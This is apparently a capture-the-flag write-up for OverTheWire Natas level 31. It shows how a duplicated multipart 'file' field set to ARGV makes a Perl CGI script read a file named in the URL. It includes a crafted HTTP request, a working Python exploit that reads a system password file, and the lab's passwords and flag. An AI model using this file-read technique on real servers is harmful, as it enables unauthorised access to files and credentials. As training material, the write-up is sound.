# Natas Level 31 Writeup (natas31) – OverTheWire

## Overview

This level focuses on exploiting a **Perl `ARGV` filehandle vulnerability**.  
The goal is to find the password for the next level.

## Observation

When we open the page, we see a file upload option for a CSV file.

We also have a link to view the source code:

```text
index-source.html
```

The important part of the source code is:

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;
        ...
    }
    print '</table>';
}
```

## Finding the Password

### Using Browser & BurpSuite

1. Create a simple CSV file:

    ```text
    1,2
    3,4
    ```

2. Upload it and intercept the request in BurpSuite.

3. The request contains the uploaded file:

    ```http
    Content-Disposition: form-data; name="file"; filename="test.csv"
    Content-Type: text/csv

    1,2
    3,4
    ```

4. We can add another `file` parameter **before** the real uploaded file:

    ```http
    Content-Disposition: form-data; name="file"

    ARGV
    ```

    So the important part of the request becomes:

    ```http
    ------geckoformboundary593963e8fc567bfae3edf8eb190e6e25
    Content-Disposition: form-data; name="file"

    ARGV
    ------geckoformboundary593963e8fc567bfae3edf8eb190e6e25
    Content-Disposition: form-data; name="file"; filename="test.csv"
    Content-Type: text/csv

    1,2
    3,4
    ```

5. The code uses:

    ```perl
    my $file = $cgi->param('file');
    ```

    Since `ARGV` is the first `file` value, `$file` becomes:

    ```text
    ARGV
    ```

6. The code then reads:

    ```perl
    while (<$file>)
    ```

    When `$file` is `ARGV`, Perl reads the arguments supplied in the URL.

7. We can give `ARGV` a filename by adding it after `?` in the URL:

    ```text
    /index.pl?/etc/natas_webpass/natas32
    ```

8. Send the modified request. The application reads:

    ```text
    /etc/natas_webpass/natas32
    ```

    and the response contains the password for **natas32**.

#### Proof

```text
<th>
    Rc3837d6qd3KoW0R2IgKssMXRX06btgY
</th>
```

### Using Python

```python
import requests, re

target = 'http://natas31.natas.labs.overthewire.org'
auth = ('natas31', 'aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z')

files = [
    ('file', (None, 'ARGV')),
    ('file', ('test.csv', '1,2\n3,4\n', 'text/csv'))
]

payload = '/index.pl?/etc/natas_webpass/natas32'

r = requests.post(target + payload, auth=auth, files=files)

match = re.search(r'<th>(\w{32})', r.text)
print(f'Password for next level is: {match.group(1)}')
```

The important part is:

```python
('file', (None, 'ARGV')),
```

It makes `ARGV` the first value of the `file` parameter.

## Vulnerability

The application uses the first `file` parameter as a file handle.

By setting it to `ARGV`, we can make Perl read the filename supplied in the URL and access files that the application can read.

## Flag

`Rc3837d6qd3KoW0R2IgKssMXRX06btgY`
